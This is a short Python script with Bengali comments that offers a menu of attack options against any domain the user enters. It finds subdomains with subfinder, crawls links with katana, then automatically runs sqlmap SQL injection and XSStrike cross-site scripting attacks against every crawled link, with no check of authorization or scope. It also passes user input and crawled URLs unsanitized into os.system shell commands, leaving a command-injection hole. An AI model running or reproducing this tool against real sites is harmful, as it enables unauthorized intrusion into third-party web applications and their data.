import os

def sql_injection_attack(target):
    # Subdomain খুঁজে বের করা
    print("Finding subdomains...")
    os.system(f"subfinder -d {target} -o subdomains.txt")
    
    # Katana দিয়ে লিংক ক্রল করা
    print("Crawling links...")
    os.system(f"katana -u {target} -o links.txt")
    
    # sqlmap দিয়ে SQL Injection পরীক্ষা করা
    print("Running SQL injection tests...")
    with open("links.txt", "r") as links:
        for link in links:
            link = link.strip()
            os.system(f"sqlmap -u {link} --batch --random-agent") # --batch ব্যবহার করলে স্বয়ংক্রিয়ভাবে চলবে

def xss_attack(target):
    # Subdomain খুঁজে বের করা
    print("Finding subdomains...")
    os.system(f"subfinder -d {target} -o subdomains.txt")
    
    # Katana দিয়ে লিংক ক্রল করা
    print("Crawling links...")
    os.system(f"katana -u {target} -o links.txt")
    
    # XSStrike দিয়ে XSS পরীক্ষা করা
    print("Running XSS tests...")
    with open("links.txt", "r") as links:
        for link in links:
            link = link.strip()
            os.system(f"python3 XSStrike/xsstrike.py -u {link}")

def subdomain_finder(target):
    # Subfinder দিয়ে subdomain খুঁজে বের করা
    print("Finding subdomains...")
    os.system(f"subfinder -d {target} -o subdomains.txt")
    print("Subdomains saved in subdomains.txt")

def crawl_web_links(target):
    # Katana দিয়ে লিংক ক্রল করা
    print("Crawling web links...")
    os.system(f"katana -u {target} -o links.txt")
    print("Links saved in links.txt")

def main():
    target = input("Enter the target domain: ")
    
    print("[1] SQL Injection")
    print("[2] XSS Attack")
    print("[3] Subdomain Finder")
    print("[4] Crawl Web Links")

    choice = input("Select an option: ")

    if choice == '1':
        sql_injection_attack(target)
    elif choice == '2':
        xss_attack(target)
    elif choice == '3':
        subdomain_finder(target)
    elif choice == '4':
        crawl_web_links(target)
    else:
        print("Invalid selection.")

if __name__ == "__main__":
    main()
